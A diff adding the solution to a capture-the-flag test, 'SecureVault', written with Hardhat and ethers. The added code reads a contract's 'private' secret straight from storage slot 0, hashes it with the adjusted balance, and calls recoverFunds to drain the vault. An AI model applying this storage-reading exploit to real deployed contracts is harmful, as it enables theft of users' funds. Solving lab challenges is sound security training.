@@ -22,6 +22,16 @@ describe("CTF #1 SecureVault", function () {
     
     // Your code goes here
 
+    // No variable is private on the contract, dont trust on private keyword...
+    let secret = ethers.BigNumber.from(await ethers.provider.getStorageAt(challengeInstance.address, 0));
+
+    let contractBalance = await ethers.provider.getBalance(challengeInstance.address);
+    contractBalance = contractBalance.add(ethers.utils.parseEther("0.0001"));
+    
+    secret = ethers.utils.solidityKeccak256([ "uint256", "uint256" ], [ secret, contractBalance ]);
+    
+    await challengeInstance.recoverFunds(secret, { value: ethers.utils.parseEther("0.0001")});
+
 
     expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal("0");
   });
